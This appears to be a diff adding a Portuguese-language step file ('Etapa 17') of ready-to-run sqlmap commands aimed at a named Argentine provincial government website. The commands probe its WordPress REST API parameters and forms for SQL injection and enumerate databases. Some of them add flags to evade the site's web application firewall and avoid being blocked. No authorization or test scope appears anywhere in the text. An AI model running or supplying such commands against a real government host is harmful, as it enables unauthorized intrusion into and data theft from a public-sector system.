@@ -1,0 +1,53 @@
+# ============================================
+# ETAPA 17: SQL INJECTION TESTING
+# Comandos sqlmap CORRIGIDOS (URLs testadas)
+# Usando 'tee' para ver progresso em tempo real
+# ============================================
+
+# IMPORTANTE: O parâmetro id já está na rota, não precisa na query string
+# URL correta: https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992
+# Para testar SQLi no ID, use: https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/1
+
+# ============================================
+# COMANDOS COM TEE (VER PROGRESSO NO TERMINAL)
+# ============================================
+
+# Comando 1: Testar endpoint com ID na rota (RECOMENDADO)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/1" --batch --dbs 2>&1 | tee etapa17_sqlmap_id_rota.txt
+
+# Comando 2: Testar endpoint com ID diferente (testar SQLi no parâmetro da rota)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992" --batch --dbs 2>&1 | tee etapa17_sqlmap_id_106992.txt
+
+# Comando 3: Testar com parâmetro page_id na query string
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?page_id=1" --batch --dbs 2>&1 | tee etapa17_sqlmap_page_id.txt
+
+# Comando 4: Testar com parâmetro password (já identificado como funcional)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" --batch --dbs 2>&1 | tee etapa17_sqlmap_password.txt
+
+# Comando 5: Testar com parâmetro context
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?context=view" --batch --dbs 2>&1 | tee etapa17_sqlmap_context.txt
+
+# Comando 6: Testar com evasão de WAF (random-agent)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/1" --batch --dbs --random-agent 2>&1 | tee etapa17_sqlmap_random_agent.txt
+
+# Comando 7: Testar com delay (evitar bloqueio)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/1" --batch --dbs --delay=2 2>&1 | tee etapa17_sqlmap_delay.txt
+
+# Comando 8: Testar endpoint base (forms e crawl)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar" --forms --crawl=2 --batch 2>&1 | tee etapa17_sqlmap_forms_crawl.txt
+
+# ============================================
+# COMANDO RECOMENDADO PARA INICIAR:
+# ============================================
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/1" --batch --dbs 2>&1 | tee etapa17_sqlmap_id_rota.txt
+
+# ============================================
+# NOTAS:
+# ============================================
+# - Use 'tee' para ver progresso no terminal E salvar no arquivo
+# - O sqlmap pode demorar vários minutos para completar
+# - Se houver bloqueio do WAF, use --random-agent ou --delay
+# - WordPress REST API geralmente não é vulnerável a SQLi (usa prepared statements)
+# - Mas vale testar todos os parâmetros identificados
+# ============================================
+
